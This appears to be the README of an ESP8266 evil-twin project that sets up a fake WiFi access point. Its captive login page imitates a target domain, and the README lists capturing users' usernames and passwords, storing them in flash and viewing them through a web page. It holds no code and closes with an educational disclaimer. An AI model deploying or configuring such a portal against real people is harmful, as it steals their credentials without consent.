# ESP8266 WiFi Captive Portal

A WiFi captive portal implementation for ESP8266 that creates a fake access point to demonstrate the security vulnerabilities of public WiFi networks.

## Overview

This project creates a fake WiFi access point that redirects all web traffic to a captive portal login page. When users connect to this access point and try to browse the web, they are presented with a login page that mimics a legitimate authentication portal.

## Features

- Creates a configurable WiFi access point
- Captures usernames and passwords entered by users
- Stores credentials in flash memory using LittleFS
- Web interface to view and clear captured credentials
- LED status indicators

## Requirements

- ESP8266 board (NodeMCU, Wemos D1 Mini, etc.)
- Arduino IDE
- LittleFS Plugin

## Installation

1. Clone this repository or download the source code
2. Open the main .ino file in Arduino IDE
4. Select your ESP8266 board from Tools > Board menu
5. Upload the HTML template file to LittleFS:
   - Install the [LittleFS Upload Tool](https://github.com/earlephilhower/arduino-littlefs-upload)
   - `[Ctrl]` + `[Shift]` + `[P]`, then "`Upload LittleFS to Pico/ESP8266/ESP32`
6. Flash the code (.ino file) to esp8266

## Usage

1. Upload the sketch to your ESP8266 board
2. The ESP8266 will create a WiFi network based on your configuration
3. Connect to this network from any device
4. Open a web browser and try to access any website
5. You will be redirected to the captive portal login page
6. Entered credentials will be stored in the ESP8266's flash memory
7. Access the credentials management URL to view captured credentials
8. Access the clear URL to clear the stored credentials

## Configuration

You can modify various parameters in the code to customize the captive portal's behavior and appearance:

- Network SSID and appearance
- Target domain to mimic
- Authentication paths and form behavior
- Visual elements of the portal

## File Structure

- Main Arduino sketch file
- HTML template for the login page
- Credential storage file in LittleFS

## Credits

This project is largely based on [ESP8266_WiFi_Captive_Portal_2.0](https://github.com/adamff-dev/ESP8266_WiFi_Captive_Portal_2.0) by adamff-dev. Additional functionality such as redirects and other enhancements have been added on top of the original implementation.

## Disclaimer

This project is provided for educational purposes only to demonstrate the security risks of connecting to unknown WiFi networks. Using this tool to collect credentials without explicit permission is illegal and unethical.